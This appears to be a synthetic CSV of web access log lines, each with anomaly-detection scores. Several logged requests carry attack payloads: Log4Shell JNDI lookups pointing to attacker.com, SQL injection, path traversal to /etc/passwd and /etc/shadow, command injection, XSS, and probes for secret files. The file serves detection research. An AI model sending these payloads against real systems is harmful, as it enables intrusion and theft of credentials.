score_content,score_session,score_fused,score_fused_norm,line
2.013730049133301,,2.013730049133301,2.013730049133301,215.182.178.232 - - [10/Jan/2025:12:04:09 +0100] "GET /logout HTTP/1.1" 200 5846 "https://www.google.com/" "sqlmap/1.5.10#stable"
11037.525390625,,11037.525390625,11037.525390625,33.113.67.95 - - [10/Jan/2025:12:04:10 +0100] "GET /wp-login.php HTTP/1.1" 503 1176 "https://www.google.com/" "curl/7.68.0"
11039.009765625,,11039.009765625,11039.009765625,96.115.139.250 - - [10/Jan/2025:12:04:14 +0100] "GET /dashboard HTTP/1.1" 500 302 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0956876277923584,,2.0956876277923584,2.0956876277923584,197.38.243.118 - - [10/Jan/2025:12:04:16 +0100] "GET /admin HTTP/1.1" 200 16464 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.9207561016082764,,1.9207561016082764,1.9207561016082764,122.230.75.249 - - [10/Jan/2025:12:04:16 +0100] "GET /dashboard HTTP/1.1" 204 9784 "https://www.google.com/" "python-requests/2.31.0"
24.373929977416992,,24.373929977416992,24.373929977416992,188.123.231.11 - - [10/Jan/2025:12:04:20 +0100] "GET /search?q=camera HTTP/1.1" 200 3780 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5495154857635498,,0.5495154857635498,0.5495154857635498,115.92.24.84 - - [10/Jan/2025:12:04:20 +0100] "GET /.env HTTP/1.1" 201 7320 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.180828094482422,,27.180828094482422,27.180828094482422,51.6.22.138 - - [10/Jan/2025:12:04:25 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 9207 "-" "nikto/2.5.0"
24.651264190673828,,24.651264190673828,24.651264190673828,131.242.15.233 - - [10/Jan/2025:12:04:29 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 19927 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.43688201904297,,24.43688201904297,24.43688201904297,4.73.89.90 - - [10/Jan/2025:12:04:30 +0100] "GET /search?q=phone HTTP/1.1" 200 12316 "https://news.ycombinator.com/" "curl/7.68.0"
3.0877060890197754,,3.0877060890197754,3.0877060890197754,206.114.74.42 - - [10/Jan/2025:12:04:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 302 13718 "https://news.ycombinator.com/" "dirb/2.22"
2.0717215538024902,,2.0717215538024902,2.0717215538024902,122.254.223.135 - - [10/Jan/2025:12:04:35 +0100] "GET /about HTTP/1.1" 200 10036 "-" "curl/7.68.0"
2.067460536956787,,2.067460536956787,2.067460536956787,107.45.143.119 - - [10/Jan/2025:12:04:39 +0100] "GET /about HTTP/1.1" 200 9056 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.5867717266082764,,0.5867717266082764,0.5867717266082764,11.211.212.78 - - [10/Jan/2025:12:04:40 +0100] "GET /.env HTTP/1.1" 200 16175 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.452699661254883,,24.452699661254883,24.452699661254883,40.68.77.245 - - [10/Jan/2025:12:04:44 +0100] "GET /api/product?id=123 HTTP/1.1" 200 180 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.46014404296875,,24.46014404296875,24.46014404296875,233.177.166.63 - - [10/Jan/2025:12:04:44 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 16218 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9047446250915527,,1.9047446250915527,1.9047446250915527,149.124.145.112 - - [10/Jan/2025:12:04:46 +0100] "GET /phpmyadmin HTTP/1.1" 200 11954 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.028567314147949,,2.028567314147949,2.028567314147949,5.217.67.42 - - [10/Jan/2025:12:04:51 +0100] "GET /profile HTTP/1.1" 200 18950 "-" "python-requests/2.31.0"
0.15581053495407104,,0.15581053495407104,0.15581053495407104,70.93.108.163 - - [10/Jan/2025:12:04:52 +0100] "GET /../../etc/passwd HTTP/1.1" 200 1833 "-" "sqlmap/1.5.10#stable"
1.8785851001739502,,1.8785851001739502,1.8785851001739502,196.25.154.193 - - [10/Jan/2025:12:04:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 6104 "https://twitter.com/" "curl/7.68.0"
2.0413129329681396,,2.0413129329681396,2.0413129329681396,25.137.149.91 - - [10/Jan/2025:12:04:56 +0100] "GET /logout HTTP/1.1" 200 11979 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.28095245361328,,27.28095245361328,27.28095245361328,88.236.234.42 - - [10/Jan/2025:12:04:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 13600 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.200428009033203,,27.200428009033203,27.200428009033203,158.177.213.244 - - [10/Jan/2025:12:04:58 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 304 18406 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30126.576171875,,30126.576171875,30126.576171875,123.90.80.177 - - [10/Jan/2025:12:05:01 +0100] "GET /contact HTTP/1.1" 400 35 "https://www.google.com/" "curl/7.68.0"
1.92872154712677,,1.92872154712677,1.92872154712677,8.191.209.31 - - [10/Jan/2025:12:05:04 +0100] "GET /dashboard HTTP/1.1" 200 10083 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.25738525390625,,24.25738525390625,24.25738525390625,34.252.21.109 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6976 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.39635467529297,,24.39635467529297,24.39635467529297,9.204.169.132 - - [10/Jan/2025:12:05:09 +0100] "GET /search?q=phone HTTP/1.1" 200 3632 "-" "python-requests/2.31.0"
24.582298278808594,,24.582298278808594,24.582298278808594,171.3.194.25 - - [10/Jan/2025:12:05:12 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 9984 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.263755798339844,,24.263755798339844,24.263755798339844,8.24.38.217 - - [10/Jan/2025:12:05:13 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11619 "https://twitter.com/" "python-requests/2.31.0"
24.233922958374023,,24.233922958374023,24.233922958374023,26.210.149.196 - - [10/Jan/2025:12:05:15 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2339 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.061344623565674,,2.061344623565674,2.061344623565674,2.250.186.26 - - [10/Jan/2025:12:05:16 +0100] "GET /logout HTTP/1.1" 200 17700 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.06968135386705399,,0.06968135386705399,0.06968135386705399,47.214.91.252 - - [10/Jan/2025:12:05:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3616 "https://news.ycombinator.com/" "dirb/2.22"
1.8137701749801636,,1.8137701749801636,1.8137701749801636,32.120.29.134 - - [10/Jan/2025:12:05:22 +0100] "GET /server-status HTTP/1.1" 200 10398 "https://news.ycombinator.com/" "curl/7.68.0"
0.3723175823688507,,0.3723175823688507,0.3723175823688507,30.99.73.117 - - [10/Jan/2025:12:05:24 +0100] "GET /index.html HTTP/1.1" 200 16277 "https://example.com/" "python-requests/2.31.0"
24.41792106628418,,24.41792106628418,24.41792106628418,75.253.219.110 - - [10/Jan/2025:12:05:29 +0100] "GET /search?q=camera HTTP/1.1" 200 13445 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0198819637298584,,2.0198819637298584,2.0198819637298584,173.27.102.113 - - [10/Jan/2025:12:05:32 +0100] "GET /profile HTTP/1.1" 200 16210 "-" "python-requests/2.31.0"
3.3898727893829346,,3.3898727893829346,3.3898727893829346,190.237.229.251 - - [10/Jan/2025:12:05:32 +0100] "GET /.env HTTP/1.1" 301 3433 "-" "curl/7.68.0"
1.9416298866271973,,1.9416298866271973,1.9416298866271973,32.60.215.109 - - [10/Jan/2025:12:05:34 +0100] "GET /dashboard HTTP/1.1" 200 13347 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.962116241455078,,4.962116241455078,4.962116241455078,92.122.171.155 - - [10/Jan/2025:12:05:36 +0100] "GET /login HTTP/1.1" 302 13214 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.18716484308242798,,0.18716484308242798,0.18716484308242798,126.128.60.161 - - [10/Jan/2025:12:05:40 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 8314 "-" "curl/7.68.0"
2.035318613052368,,2.035318613052368,2.035318613052368,249.46.98.155 - - [10/Jan/2025:12:05:40 +0100] "GET /about HTTP/1.1" 200 976 "https://example.com/" "sqlmap/1.5.10#stable"
3.223658800125122,,3.223658800125122,3.223658800125122,197.127.203.120 - - [10/Jan/2025:12:05:41 +0100] "GET /.git/config HTTP/1.1" 302 17137 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.61082649230957,,24.61082649230957,24.61082649230957,140.5.244.196 - - [10/Jan/2025:12:05:46 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 17812 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30148.623046875,,30148.623046875,30148.623046875,118.10.9.46 - - [10/Jan/2025:12:05:46 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 906 "https://www.google.com/" "python-requests/2.31.0"
27.332538604736328,,27.332538604736328,27.332538604736328,196.29.146.173 - - [10/Jan/2025:12:05:49 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 16072 "https://twitter.com/" "nikto/2.5.0"
24.593605041503906,,24.593605041503906,24.593605041503906,130.15.101.68 - - [10/Jan/2025:12:05:54 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 5221 "https://twitter.com/" "nikto/2.5.0"
27.2642822265625,,27.2642822265625,27.2642822265625,83.16.8.152 - - [10/Jan/2025:12:05:57 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 304 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.954642295837402,,4.954642295837402,4.954642295837402,98.25.110.89 - - [10/Jan/2025:12:05:59 +0100] "GET /admin HTTP/1.1" 302 11282 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.27257537841797,,24.27257537841797,24.27257537841797,152.22.234.177 - - [10/Jan/2025:12:06:01 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 10326 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.032916784286499,,2.032916784286499,2.032916784286499,118.169.222.109 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 200 1324 "https://example.com/" "dirb/2.22"
11039.2490234375,,11039.2490234375,11039.2490234375,147.100.83.147 - - [10/Jan/2025:12:06:01 +0100] "GET /admin HTTP/1.1" 502 773 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.28156852722168,,24.28156852722168,24.28156852722168,208.196.171.87 - - [10/Jan/2025:12:06:01 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 16574 "https://twitter.com/" "curl/7.68.0"
1.7756640911102295,,1.7756640911102295,1.7756640911102295,216.218.138.55 - - [10/Jan/2025:12:06:03 +0100] "GET /server-status HTTP/1.1" 200 2568 "https://example.com/" "python-requests/2.31.0"
3.4479522705078125,,3.4479522705078125,3.4479522705078125,184.217.149.25 - - [10/Jan/2025:12:06:03 +0100] "GET /.env HTTP/1.1" 304 3113 "https://example.com/" "sqlmap/1.5.10#stable"
24.622474670410156,,24.622474670410156,24.622474670410156,204.20.167.211 - - [10/Jan/2025:12:06:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 11480 "https://twitter.com/" "python-requests/2.31.0"
24.440044403076172,,24.440044403076172,24.440044403076172,65.160.132.117 - - [10/Jan/2025:12:06:05 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13282 "-" "curl/7.68.0"
0.2508527338504791,,0.2508527338504791,0.2508527338504791,170.247.211.191 - - [10/Jan/2025:12:06:10 +0100] "GET /assets/app.js HTTP/1.1" 200 7078 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30126.392578125,,30126.392578125,30126.392578125,161.16.134.52 - - [10/Jan/2025:12:06:15 +0100] "GET /server-status HTTP/1.1" 404 1488 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30148.591796875,,30148.591796875,30148.591796875,82.221.213.234 - - [10/Jan/2025:12:06:16 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 400 840 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.423555374145508,,24.423555374145508,24.423555374145508,176.154.61.104 - - [10/Jan/2025:12:06:19 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 204 8503 "-" "Wget/1.20.3 (linux-gnu)"
27.185426712036133,,27.185426712036133,27.185426712036133,119.125.144.254 - - [10/Jan/2025:12:06:20 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 10275 "https://news.ycombinator.com/" "dirb/2.22"
1.9035741090774536,,1.9035741090774536,1.9035741090774536,8.67.203.206 - - [10/Jan/2025:12:06:25 +0100] "GET /api/products HTTP/1.1" 200 4570 "https://twitter.com/" "curl/7.68.0"
11037.33984375,,11037.33984375,11037.33984375,201.6.15.221 - - [10/Jan/2025:12:06:26 +0100] "GET /wp-login.php HTTP/1.1" 500 995 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30126.4375,,30126.4375,30126.4375,230.94.172.169 - - [10/Jan/2025:12:06:30 +0100] "GET /phpmyadmin HTTP/1.1" 403 833 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.46104621887207,,24.46104621887207,24.46104621887207,239.31.134.171 - - [10/Jan/2025:12:06:35 +0100] "GET /api/product?id=123 HTTP/1.1" 200 16492 "https://twitter.com/" "python-requests/2.31.0"
1.8680717945098877,,1.8680717945098877,1.8680717945098877,198.207.81.85 - - [10/Jan/2025:12:06:37 +0100] "GET /phpmyadmin HTTP/1.1" 200 4106 "https://www.google.com/" "dirb/2.22"
0.31501761078834534,,0.31501761078834534,0.31501761078834534,113.105.66.221 - - [10/Jan/2025:12:06:40 +0100] "GET /.git/config HTTP/1.1" 200 9096 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3345109522342682,,0.3345109522342682,0.3345109522342682,122.175.64.247 - - [10/Jan/2025:12:06:44 +0100] "GET /.git/config HTTP/1.1" 200 13986 "https://www.google.com/" "python-requests/2.31.0"
30148.654296875,,30148.654296875,30148.654296875,166.248.232.156 - - [10/Jan/2025:12:06:46 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 400 43 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.447725296020508,,24.447725296020508,24.447725296020508,80.164.246.180 - - [10/Jan/2025:12:06:51 +0100] "GET /api/product?id=123 HTTP/1.1" 200 12705 "-" "curl/7.68.0"
24.416187286376953,,24.416187286376953,24.416187286376953,238.251.235.66 - - [10/Jan/2025:12:06:55 +0100] "GET /search?q=camera HTTP/1.1" 200 12977 "-" "curl/7.68.0"
30124.7109375,,30124.7109375,30124.7109375,82.226.208.197 - - [10/Jan/2025:12:06:56 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 404 1293 "-" "dirb/2.22"
24.342618942260742,,24.342618942260742,24.342618942260742,238.216.86.184 - - [10/Jan/2025:12:06:58 +0100] "GET /search?q=headphones HTTP/1.1" 200 13631 "-" "Wget/1.20.3 (linux-gnu)"
1.9313675165176392,,1.9313675165176392,1.9313675165176392,187.209.141.189 - - [10/Jan/2025:12:06:59 +0100] "GET /phpmyadmin HTTP/1.1" 200 19830 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.2706318795681,,0.2706318795681,0.2706318795681,162.114.203.165 - - [10/Jan/2025:12:07:04 +0100] "GET /wp-login.php HTTP/1.1" 201 6120 "-" "curl/7.68.0"
24.401514053344727,,24.401514053344727,24.401514053344727,29.41.64.133 - - [10/Jan/2025:12:07:07 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 2794 "https://twitter.com/" "curl/7.68.0"
24.400148391723633,,24.400148391723633,24.400148391723633,67.45.176.152 - - [10/Jan/2025:12:07:12 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4474 "https://example.com/" "sqlmap/1.5.10#stable"
24.36390495300293,,24.36390495300293,24.36390495300293,242.214.227.147 - - [10/Jan/2025:12:07:13 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 12464 "-" "Wget/1.20.3 (linux-gnu)"
30148.712890625,,30148.712890625,30148.712890625,51.68.180.219 - - [10/Jan/2025:12:07:13 +0100] "GET /api/product?id=123 HTTP/1.1" 403 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.59112548828125,,24.59112548828125,24.59112548828125,44.243.146.31 - - [10/Jan/2025:12:07:16 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 12156 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30148.560546875,,30148.560546875,30148.560546875,31.58.183.53 - - [10/Jan/2025:12:07:19 +0100] "GET /search?q=camera HTTP/1.1" 400 1012 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.389982223510742,,24.389982223510742,24.389982223510742,154.56.211.73 - - [10/Jan/2025:12:07:21 +0100] "GET /search?q=laptop HTTP/1.1" 200 6870 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.18882597982883453,,0.18882597982883453,0.18882597982883453,61.159.116.233 - - [10/Jan/2025:12:07:24 +0100] "GET /../../etc/passwd HTTP/1.1" 200 8678 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.21537667512893677,,0.21537667512893677,0.21537667512893677,35.224.83.250 - - [10/Jan/2025:12:07:28 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 15464 "https://www.google.com/" "dirb/2.22"
4.68320894241333,,4.68320894241333,4.68320894241333,19.25.143.16 - - [10/Jan/2025:12:07:33 +0100] "GET /server-status HTTP/1.1" 302 8496 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11061.6005859375,,11061.6005859375,11061.6005859375,248.206.154.182 - - [10/Jan/2025:12:07:34 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 503 1373 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.5757225155830383,,0.5757225155830383,0.5757225155830383,172.95.34.248 - - [10/Jan/2025:12:07:36 +0100] "GET /.env HTTP/1.1" 200 13033 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30148.9375,,30148.9375,30148.9375,34.23.82.182 - - [10/Jan/2025:12:07:37 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 404 958 "https://www.google.com/" "dirb/2.22"
11037.3388671875,,11037.3388671875,11037.3388671875,224.250.214.72 - - [10/Jan/2025:12:07:39 +0100] "GET /wp-login.php HTTP/1.1" 500 1022 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
